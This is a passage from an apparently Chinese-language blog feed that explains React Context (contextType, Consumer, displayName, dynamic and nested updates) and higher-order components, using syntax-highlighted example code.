<p>挂载在 class 上的 contextType 属性会被重赋值为一个由 React.createContext() 创建的 Context 对象。这能让你使用 this.context 来消费最近 Context 上的那个值。你可以在任何生命周期中访问到它，包括 render 函数中。</p>
<p>如果你正在使用实验性的 public class fields 语法，你可以使用 static 这个类属性来初始化你的 contextType。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> contextType = MyContext;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">let</span> value = <span class="keyword">this</span>.context;</span><br><span class="line">    <span class="comment">/* 基于这个值进行渲染工作 */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Context-Consumer"><a href="#Context-Consumer" class="headerlink" title="Context.Consumer"></a>Context.Consumer</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;MyContext.Consumer&gt;</span><br><span class="line">  &#123;value =&gt; <span class="comment">/* 基于 context 值进行渲染*/</span>&#125;</span><br><span class="line">&lt;<span class="regexp">/MyContext.Consumer&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里，React 组件也可以订阅到 context 变更。这能让你在函数式组件中完成订阅 context。</p>
<p>这需要函数作为子元素（function as a child）这种做法。这个函数接收当前的 context 值，返回一个 React 节点。传递给函数的 value 值等同于往上组件树离这个 context 最近的 Provider 提供的 value 值。如果没有对应的 Provider，value 参数等同于传递给 createContext() 的 defaultValue。</p>
<h2 id="Context-displayName"><a href="#Context-displayName" class="headerlink" title="Context.displayName"></a>Context.displayName</h2><p>context 对象接受一个名为 displayName 的 property，类型为字符串。React DevTools 使用该字符串来确定 context 要显示的内容。</p>
<p>示例，下述组件在 DevTools 中将显示为 MyDisplayName：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MyContext = React.createContext(<span class="comment">/* some value */</span>);</span><br><span class="line">MyContext.displayName = <span class="string">'MyDisplayName'</span>;</span><br><span class="line"></span><br><span class="line">&lt;MyContext.Provider&gt; <span class="comment">// "MyDisplayName.Provider" 在 DevTools 中</span></span><br><span class="line">&lt;MyContext.Consumer&gt; <span class="comment">// "MyDisplayName.Consumer" 在 DevTools 中</span></span><br></pre></td></tr></table></figure></p>
<h2 id="动态-Context"><a href="#动态-Context" class="headerlink" title="动态 Context"></a>动态 Context</h2><p>theme-context.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> themes = &#123;</span><br><span class="line">  light: &#123;</span><br><span class="line">    color: <span class="string">"yellow"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  dark: &#123;</span><br><span class="line">    color: <span class="string">"blue"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> ThemeContext = React.createContext(</span><br><span class="line">  themes.dark <span class="comment">// 默认值</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>themed-button.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ThemeContext &#125; <span class="keyword">from</span> <span class="string">"./theme-context"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThemedButton</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> props = <span class="keyword">this</span>.props;</span><br><span class="line">    <span class="keyword">const</span> theme = <span class="keyword">this</span>.context;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;button &#123;...props&#125; style=&#123;&#123; <span class="attr">backgroundColor</span>: theme.color &#125;&#125;&gt;</span><br><span class="line">        btn</span><br><span class="line">      &lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">ThemedButton.contextType = ThemeContext;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default ThemedButton;</span></span><br></pre></td></tr></table></figure></p>
<p>app.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; ThemeContext, themes &#125; <span class="keyword">from</span> <span class="string">"./theme-context"</span>;</span><br><span class="line"><span class="keyword">import</span> ThemedButton <span class="keyword">from</span> <span class="string">"./ThemedButton.jsx"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个使用 ThemedButton 的中间组件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Toolbar</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">ThemedButton</span> <span class="attr">onClick</span>=<span class="string">&#123;props.changeTheme&#125;</span> /&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      theme: themes.light</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.toggleTheme = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(<span class="function"><span class="params">state</span> =&gt;</span> (&#123;</span><br><span class="line">        theme: state.theme === themes.dark ? themes.light : themes.dark</span><br><span class="line">      &#125;));</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;ThemeContext.Provider value=&#123;<span class="keyword">this</span>.state.theme&#125;&gt;</span><br><span class="line">        &lt;Toolbar changeTheme=&#123;<span class="keyword">this</span>.toggleTheme&#125; /&gt;</span><br><span class="line">      &lt;<span class="regexp">/ThemeContext.Provider&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default App;</span></span><br></pre></td></tr></table></figure>
<p>对于上面的 theme 例子，使用动态值（dynamic values）后更复杂的用法：</p>
<h2 id="在嵌套组件中更新-Context"><a href="#在嵌套组件中更新-Context" class="headerlink" title="在嵌套组件中更新 Context"></a>在嵌套组件中更新 Context</h2><p>从一个在组件树中嵌套很深的组件中更新 context 是很有必要的。在这种场景下，你可以通过 context 传递一个函数，使得 consumers 组件更新 context。</p>
<p>theme-context.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> themes = &#123;</span><br><span class="line">  light: &#123;</span><br><span class="line">    color: <span class="string">"yellow"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  dark: &#123;</span><br><span class="line">    color: <span class="string">"blue"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> ThemeContext = React.createContext(&#123;</span><br><span class="line">  theme: themes.dark,</span><br><span class="line">  toggleTheme: <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>theme-toggler-button.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ThemeContext &#125; <span class="keyword">from</span> <span class="string">"./theme-context"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ThemeTogglerButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;ThemeContext.Consumer&gt;</span><br><span class="line">      &#123;(&#123; theme, toggleTheme &#125;) =&gt; (</span><br><span class="line">        &lt;button onClick=&#123;toggleTheme&#125; style=&#123;&#123; <span class="attr">backgroundColor</span>: theme.color &#125;&#125;&gt;</span><br><span class="line">          Toggle Theme</span><br><span class="line">        &lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">      )&#125;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>ThemeContext.Consumer&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> ThemeTogglerButton;</span><br></pre></td></tr></table></figure>
<p>app.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; ThemeContext, themes &#125; <span class="keyword">from</span> <span class="string">"./theme-context"</span>;</span><br><span class="line"><span class="keyword">import</span> ThemeTogglerButton <span class="keyword">from</span> <span class="string">"./theme-toggler-button"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.toggleTheme = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(<span class="function"><span class="params">state</span> =&gt;</span> (&#123;</span><br><span class="line">        theme: state.theme === themes.dark ? themes.light : themes.dark</span><br><span class="line">      &#125;));</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      theme: themes.light,</span><br><span class="line">      toggleTheme: <span class="keyword">this</span>.toggleTheme</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;ThemeContext.Provider value=&#123;<span class="keyword">this</span>.state&#125;&gt;</span><br><span class="line">        &lt;Content /&gt;</span><br><span class="line">      &lt;<span class="regexp">/ThemeContext.Provider&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">function Content() &#123;</span></span><br><span class="line"><span class="regexp">  return (</span></span><br><span class="line"><span class="regexp">    &lt;div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;ThemeTogglerButton /</span>&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default App;</span></span><br></pre></td></tr></table></figure>
<h2 id="消费多个-Context"><a href="#消费多个-Context" class="headerlink" title="消费多个 Context"></a>消费多个 Context</h2><p>为了确保 context 快速进行重渲染，React 需要使每一个 consumers 组件的 context 在组件树中成为一个单独的节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ThemeContext = React.createContext(<span class="string">"light"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> UserContext = React.createContext(<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;ThemeContext.Provider value=&#123;<span class="string">"light"</span>&#125;&gt;</span><br><span class="line">        &lt;UserContext.Provider value=&#123;<span class="string">"user"</span>&#125;&gt;</span><br><span class="line">          &lt;Layout /&gt;</span><br><span class="line">        &lt;<span class="regexp">/UserContext.Provider&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>ThemeContext.Provider&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Layout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Content</span> /&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Content</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;ThemeContext.Consumer&gt;</span><br><span class="line">      &#123;theme =&gt; (</span><br><span class="line">        &lt;UserContext.Consumer&gt;</span><br><span class="line">          &#123;user =&gt; (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">              &#123;user&#125; &#123;theme&#125;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">          )&#125;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>UserContext.Consumer&gt;</span><br><span class="line">      )&#125;</span><br><span class="line">    &lt;<span class="regexp">/ThemeContext.Consumer&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default App;</span></span><br></pre></td></tr></table></figure>
<p>如果两个或者更多的 context 值经常被一起使用，那你可能要考虑一下另外创建你自己的渲染组件，以提供这些值。</p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>因为 context 会使用参考标识（reference identity）来决定何时进行渲染，这里可能会有一些陷阱，当 provider 的父组件进行重渲染时，可能会在 consumers 组件中触发意外的渲染。</p>
<p>举个例子，当每一次 Provider 重渲染时，以下的代码会重渲染所有下面的 consumers 组件，因为 value 属性总是被赋值为新的对象：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;MyContext.Provider value=&#123;&#123;<span class="attr">something</span>: <span class="string">'something'</span>&#125;&#125;&gt;</span><br><span class="line">        &lt;Toolbar /&gt;</span><br><span class="line">      &lt;<span class="regexp">/MyContext.Provider&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>为了防止这种情况，将 value 状态提升到父节点的 state 里：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      value: &#123;<span class="attr">something</span>: <span class="string">'something'</span>&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;Provider value=&#123;<span class="keyword">this</span>.state.value&#125;&gt;</span><br><span class="line">        &lt;Toolbar /&gt;</span><br><span class="line">      &lt;<span class="regexp">/Provider&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>react-高阶组件</title>
    <url>/2020/09/08/react-%E9%AB%98%E9%98%B6%E7%BB%84%E4%BB%B6/</url>
    <content><![CDATA[<p>高阶组件<br><a id="more"></a><br>高阶组件（HOC）是 React 中用于复用组件逻辑的一种高级技巧。HOC 自身不是 React API 的一部分，它是一种基于 React 的组合特性而形成的设计模式。</p>
<p>具体而言，高阶组件是参数为组件，返回值为新组件的函数。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> EnhancedComponent = higherOrderComponent(WrappedComponent);</span><br></pre></td></tr></table></figure></p>
<h2 id="使用-HOC-解决横切关注点问题"><a href="#使用-HOC-解决横切关注点问题" class="headerlink" title="使用 HOC 解决横切关注点问题"></a>使用 HOC 解决横切关注点问题</h2><p>组件是 React 中代码复用的基本单元。但你会发现某些模式并不适合传统组件。</p>
<p>例如，假设有一个 CommentList 组件，它订阅外部数据源，用以渲染评论列表：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommentList</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.handleChange = <span class="keyword">this</span>.handleChange.bind(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      <span class="comment">// 假设 "DataSource" 是个全局范围内的数据源变量</span></span><br><span class="line">      comments: DataSource.getComments()</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    <span class="comment">// 订阅更改</span></span><br><span class="line">    DataSource.addChangeListener(<span class="keyword">this</span>.handleChange);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentWillUnmount() &#123;</span><br><span class="line">    <span class="comment">// 清除订阅</span></span><br><span class="line">    DataSource.removeChangeListener(<span class="keyword">this</span>.handleChange);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleChange() &#123;</span><br><span class="line">    <span class="comment">// 当数据源更新时，更新组件状态</span></span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      comments: DataSource.getComments()</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &#123;<span class="keyword">this</span>.state.comments.map(<span class="function">(<span class="params">comment</span>) =&gt;</span> (</span><br><span class="line">          &lt;Comment comment=&#123;comment&#125; key=&#123;comment.id&#125; /&gt;</span><br><span class="line">        ))&#125;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>稍后，编写了一个用于订阅单个博客帖子的组件，该帖子遵循类似的模式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogPost</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.handleChange = <span class="keyword">this</span>.handleChange.bind(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      blogPost: DataSource.getBlogPost(props.id)</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    DataSource.addChangeListener(<span class="keyword">this</span>.handleChange);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentWillUnmount() &#123;</span><br><span class="line">    DataSource.removeChangeListener(<span class="keyword">this</span>.handleChange);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleChange() &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      blogPost: DataSource.getBlogPost(<span class="keyword">this</span>.props.id)</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">TextBlock</span> <span class="attr">text</span>=<span class="string">&#123;this.state.blogPost&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>它们的大部分实现都是一样的：</p>
<p>在挂载时，向 DataSource 添加一个更改侦听器。</p>
<p>在侦听器内部，当数据源发生变化时，调用 setState。</p>
<p>在卸载时，删除侦听器。</p>
<p>我们需要一个抽象，允许我们在一个地方定义这个逻辑，并在许多组件之间共享它。这正是高阶组件擅长的地方。</p>
<p>我们可以编写一个创建组件函数。该函数将接受一个子组件作为它的其中一个参数，该子组件将订阅数据作为 prop。让我们调用函数 withSubscription：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> CommentListWithSubscription = withSubscription(</span><br><span class="line">  CommentList,</span><br><span class="line">  (DataSource) =&gt; DataSource.getComments()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> BlogPostWithSubscription = withSubscription(</span><br><span class="line">  BlogPost,</span><br><span class="line">  (DataSource, props) =&gt; DataSource.getBlogPost(props.id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>当渲染 CommentListWithSubscription 和 BlogPostWithSubscription 时， CommentList 和 BlogPost 将传递一个 data prop，其中包含从 DataSource 检索到的最新数据：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 此函数接收一个组件...</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withSubscription</span>(<span class="params">WrappedComponent, selectData</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...并返回另一个组件...</span></span><br><span class="line">  <span class="keyword">return</span> <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">      <span class="keyword">super</span>(props);</span><br><span class="line">      <span class="keyword">this</span>.handleChange = <span class="keyword">this</span>.handleChange.bind(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">this</span>.state = &#123;</span><br><span class="line">        data: selectData(DataSource, props)</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentDidMount() &#123;</span><br><span class="line">      <span class="comment">// ...负责订阅相关的操作...</span></span><br><span class="line">      DataSource.addChangeListener(<span class="keyword">this</span>.handleChange);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentWillUnmount() &#123;</span><br><span class="line">      DataSource.removeChangeListener(<span class="keyword">this</span>.handleChange);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handleChange() &#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">        data: selectData(DataSource, <span class="keyword">this</span>.props)</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="comment">// ... 并使用新数据渲染被包装的组件!</span></span><br><span class="line">      <span class="comment">// 请注意，我们可能还会传递其他属性</span></span><br><span class="line">      <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">WrappedComponent</span> <span class="attr">data</span>=<span class="string">&#123;this.state.data&#125;</span> &#123;<span class="attr">...this.props</span>&#125; /&gt;</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>HOC 不会修改传入的组件，也不会使用继承来复制其行为。相反，HOC 通过将组件包装在容器组件中来组成新组件。HOC 是纯函数，没有副作用。</p>
<p>被包装组件接收来自容器组件的所有 prop，同时也接收一个新的用于 render 的 data prop。HOC 不需要关心数据的使用方式或原因，而被包装组件也不需要关心数据是怎么来的。</p>
<p>与组件一样，withSubscription 和包装组件之间的契约完全基于之间传递的 props。这种依赖方式使得替换 HOC 变得容易，只要它们为包装的组件提供相同的 prop 即可。</p>
<h2 id="不要改变原始组件。使用组合。"><a href="#不要改变原始组件。使用组合。" class="headerlink" title="不要改变原始组件。使用组合。"></a>不要改变原始组件。使用组合。</h2><p>不要试图在 HOC 中修改组件原型（或以其他方式改变它）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logProps</span>(<span class="params">InputComponent</span>) </span>&#123;</span><br><span class="line">  InputComponent.prototype.componentDidUpdate = <span class="function"><span class="keyword">function</span>(<span class="params">prevProps</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Current props: '</span>, <span class="keyword">this</span>.props);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Previous props: '</span>, prevProps);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 返回原始的 input 组件，暗示它已经被修改。</span></span><br><span class="line">  <span class="keyword">return</span> InputComponent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每次调用 logProps 时，增强组件都会有 log 输出。</span></span><br><span class="line"><span class="keyword">const</span> EnhancedComponent = logProps(InputComponent);</span><br></pre></td></tr></table></figure>
<p>这样做会产生一些不良后果。其一是输入组件再也无法像 HOC 增强之前那样使用了。更严重的是，如果你再用另一个同样会修改 componentDidUpdate 的 HOC 增强它，那么前面的 HOC 就会失效！同时，这个 HOC 也无法应用于没有生命周期的函数组件。</p>
<p>修改传入组件的 HOC 是一种糟糕的抽象方式。调用者必须知道他们是如何实现的，以避免与其他 HOC 发生冲突。</p>
<p>HOC 不应该修改传入组件，而应该使用组合的方式，通过将组件包装在容器组件中实现功能：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logProps</span>(<span class="params">WrappedComponent</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    componentDidUpdate(prevProps) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'Current props: '</span>, <span class="keyword">this</span>.props);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'Previous props: '</span>, prevProps);</span><br><span class="line">    &#125;</span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">WrappedComponent</span> &#123;<span class="attr">...this.props</span>&#125; /&gt;</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该 HOC 与上文中修改传入组件的 HOC 功能相同，同时避免了出现冲突的情况。它同样适用于 class 组件和函数组件。而且因为它是一个纯函数，它可以与其他 HOC 组合，甚至可以与其自身组合。</p>
<p>您可能已经注意到 HOC 与容器组件模式之间有相似之处。容器组件担任分离将高层和低层关注的责任，由容器管理订阅和状态，并将 prop 传递给处理渲染 UI。HOC 使用容器作为其实现的一部分，你可以将 HOC 视为参数化容器组件。</p>
<h2 id="约定：将不相关的-props-传递给被包裹的组件"><a href="#约定：将不相关的-props-传递给被包裹的组件" class="headerlink" title="约定：将不相关的 props 传递给被包裹的组件"></a>约定：将不相关的 props 传递给被包裹的组件</h2><p>HOC 为组件添加特性。自身不应该大幅改变约定。HOC 返回的组件与原组件应保持类似的接口。</p>
<p>HOC 应该透传与自身无关的 props。大多数 HOC 都应该包含一个类似于下面的 render 方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">render() &#123;</span><br><span class="line">  <span class="comment">// 过滤掉非此 HOC 额外的 props，且不要进行透传</span></span><br><span class="line">  <span class="keyword">const</span> &#123; extraProp, ...passThroughProps &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将 props 注入到被包装的组件中。</span></span><br><span class="line">  <span class="comment">// 通常为 state 的值或者实例方法。</span></span><br><span class="line">  <span class="keyword">const</span> injectedProp = someStateOrInstanceMethod;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将 props 传递给被包装组件</span></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;WrappedComponent</span><br><span class="line">      injectedProp=&#123;injectedProp&#125;</span><br><span class="line">      &#123;...passThroughProps&#125;</span><br><span class="line">    /&gt;</span><br><span class="line">  );</span><br><span 